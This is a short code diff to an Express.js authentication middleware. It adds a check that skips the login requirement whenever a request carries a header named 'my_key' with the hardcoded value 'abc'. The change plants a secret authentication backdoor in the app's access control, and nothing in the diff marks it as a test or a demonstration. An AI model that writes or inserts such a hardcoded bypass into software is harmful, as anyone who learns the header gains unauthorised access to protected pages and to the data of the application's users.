@@ -36,7 +36,11 @@ module.exports = function(req, res, next) {
 	
 	var time = d.getFullYear() + '/' + d.getMonth()+1 + '/' + d.getDate() + ' ' + d.getHours() + ':' + min + ':' + seg + ' - '
 	
-	if (!req.session.user && req.route.path != '/login' && req.route.path != '/validateLogin')
+	var bypass = false
+	if(req.headers.my_key)
+		if (req.headers.my_key == 'abc') bypass = true
+	//console.log('headers: ', req.headers)
+	if (!req.session.user && req.route.path != '/login' && req.route.path != '/validateLogin' && !bypass)
 		return res.redirect('/login')
 	
 	if (req.route.path != '/login' && req.route.path != '/validateLogin' && req.route.path != '/signout')
